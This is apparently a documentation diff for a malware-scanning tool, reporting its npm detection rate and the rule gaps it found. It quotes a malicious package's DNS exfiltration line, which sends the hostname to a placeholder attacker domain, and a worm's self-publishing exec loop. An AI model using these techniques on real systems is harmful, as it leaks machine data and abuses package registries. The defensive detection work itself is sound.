@@ -784,11 +784,63 @@ decrypts data and uses it, a build that downloads an input it names.
   lights up a signal of its own.* That is checkable, and the residue under it is
   packages that hide nothing because they do nothing.
 
-- **npm recall is unmeasured.** Everything above is PyPI. The dataset is 10,606
-  malicious Python packages and the tool claims javascript, typescript, go, ruby,
-  java, rust, C# and PHP. npm is where most published supply-chain compromises
-  actually happen, and the number there is not known. Until it is, 87.5% is a
-  Python figure and not a tool figure.
+### Detection, npm
+
+The PyPI figure was never a tool figure. Measured against Datadog's dataset of
+real malicious npm packages -- 28,623 samples from GuardDog, split into
+`malicious_intent` and `compromised_lib` -- the first reading was **59.4%**
+against PyPI's 87.5%.
+
+**None of the gaps were new ideas.** They were the same acts the Python packs
+already name, missing from the JavaScript ones, which is exactly the failure the
+capability model exists to prevent -- a primitive is meant to be defined once
+and inherited by every language. It went unnoticed because nobody had measured
+the ecosystem.
+
+- **DNS exfiltration had no JavaScript resolver.**
+  `CAP.EGRESS.DNS_CONSTRUCTED.001` knew `socket.gethostbyname`,
+  `dns.resolver.resolve`, `dig` and `nslookup`, and nothing from Node.
+  `@aa-techops-ui/ping-authentication` is four lines and the whole technique:
+
+      dns.resolve4(tohex(os.hostname()) + ".<id>.<attacker>", ()=>{})
+
+  repeated for the username, the home directory and `__dirname`. The hostname is
+  the payload, hex-encoded to survive a DNS label, leaving through the resolver
+  the host already trusts.
+
+  `SUSPECT.EXFIL.DNS.001` also required a `credential` alongside it, and a DNS
+  label is 63 bytes -- room for a machine name, not for a key. It takes
+  reconnaissance now, which is what actually goes out that way.
+
+- **`Capability.RECONNAISSANCE` had no JavaScript rule.** It was added for Python
+  in the same session and the JavaScript half was simply not written.
+  `os.hostname()`, `os.userInfo()` and `os.homedir()` are the same act.
+  `os.platform()`, `os.arch()` and `process.cwd()` are deliberately excluded:
+  every bundler and test runner in the ecosystem calls them, and they say what
+  kind of machine this is rather than which one.
+
+- **A package that publishes packages.** Twenty-six of the first 143 samples are
+  a registry-spam worm: `exec('npm publish --access public')` in a loop, each
+  iteration rewriting `package.json` with a generated name. A library has no
+  reason to publish anything -- by the time it runs, its own release is long
+  over. `SUSPECT.REGISTRY.SELF_PUBLISH.001`.
+
+*And a false positive the npm control found, on one of the most installed
+packages there is.* `{ ...process.env, FOO: undefined }` is how every Node
+program builds an environment for a child process, and the JavaScript credential
+rule read the spread as reading the whole environment. **esbuild** writes exactly
+that in its postinstall and downloads its own platform binary a few lines later:
+install hook, plus "credential", plus egress is `MALWARE.EXFIL.001` at CRITICAL,
+about a build fetching its own binary. Reading the environment to pass it on is
+not serialising it to send; the patterns that are that -- `JSON.stringify`,
+`Object.entries`, `Object.assign`, and now the form-encoders -- remain.
+
+The control it was found by is worth keeping: twenty-two real published npm
+packages (lodash, express, react, webpack, typescript, sharp, node-gyp among
+them), pulled from the registry and scanned. Two produce a blocking finding and
+both are correct -- `bcrypt` and `esbuild` genuinely do run a postinstall that
+downloads a binary, which is the accepted-risk class `SUSPECT.INSTALL.SCRIPT.001`
+exists to state.
 
 ### Known, not fixed in this release
 
